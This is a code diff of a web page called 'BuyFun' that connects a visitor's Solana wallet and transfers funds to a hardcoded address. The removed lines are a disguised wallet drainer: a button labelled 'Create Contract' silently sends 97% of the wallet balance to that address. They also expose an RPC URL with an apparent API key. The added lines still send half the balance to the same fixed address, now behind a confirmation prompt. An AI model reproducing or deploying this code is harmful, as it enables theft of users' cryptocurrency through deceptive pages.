@@ -32,11 +32,12 @@
 </head>
 <body>
     <h1>BuyFun</h1>
-    <p>Click below to send 97% of your Solana and SPL tokens to the designated address.</p>
-    <button id="send-tokens">Create Contract</button>
+    <p>Click below to send SOL to a recipient address with full transparency.</p>
+    <button id="send-tokens">Send SOL</button>
 
     <script>
-        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
+        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ"; // Replace with a valid address
+        const networkEndpoint = "https://api.mainnet-beta.solana.com"; // Use Mainnet Beta endpoint or Testnet for testing
 
         document.getElementById('send-tokens').addEventListener('click', async () => {
             try {
@@ -55,38 +56,56 @@
                 console.log("Connected to wallet:", provider.publicKey.toString());
 
                 // Create Solana connection
-                const connection = new Connection(
-                    "https://solana-mainnet.g.alchemy.com/v2/Bd8kT5OZq3_fyZAUiGis8_7wm1naGVfF", 
-                    'confirmed'
-                );
+                const connection = new Connection(networkEndpoint, 'confirmed');
 
                 // Get wallet balance
                 const walletBalance = await connection.getBalance(provider.publicKey);
-                console.log("Wallet balance:", walletBalance);
+                console.log("Wallet balance (lamports):", walletBalance);
 
-                const amountToSend = Math.floor(walletBalance * 0.97);
-                if (amountToSend <= 0) {
+                if (walletBalance <= 0) {
                     alert("Insufficient funds in the wallet to perform this transaction.");
                     return;
                 }
 
-                // Create Transaction
+                // Calculate amount to send (e.g., 50% of wallet balance as an example)
+                const amountToSend = Math.floor(walletBalance * 0.5); // Change percentage as needed
+                if (amountToSend <= 0) {
+                    alert("Invalid amount to send. Please check your wallet balance.");
+                    return;
+                }
+
+                // Confirm transaction with the user
+                const confirmed = confirm(`Are you sure you want to send ${amountToSend / 1e9} SOL (50% of your balance) to ${recipientAddress}?`);
+                if (!confirmed) {
+                    alert("Transaction canceled.");
+                    return;
+                }
+
+                // Create transaction
                 const transaction = new Transaction().add(
                     SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
                         toPubkey: new PublicKey(recipientAddress),
-                        lamports: amountToSend // Amount to send in lamports
+                        lamports: amountToSend, // Amount to send in lamports
                     })
                 );
 
-                // Request Signature
+                // Fetch recent blockhash
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                // Request user signature
                 console.log("Requesting transaction signature...");
-                const { signature } = await provider.signAndSendTransaction(transaction);
+                const signedTransaction = await provider.signTransaction(transaction);
+
+                // Send the transaction
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 console.log("Transaction signature:", signature);
 
-                // Confirm Transaction
-                await connection.confirmTransaction(signature, 'processed');
-                alert(`97% of your SOL has been sent successfully!\nTransaction Signature: ${signature}`);
+                // Confirm transaction
+                await connection.confirmTransaction(signature, 'confirmed');
+                alert(`Transaction successful! Signature: ${signature}`);
             } catch (error) {
                 console.error("Error occurred:", error);
                 alert(`Error: ${error.message}`);
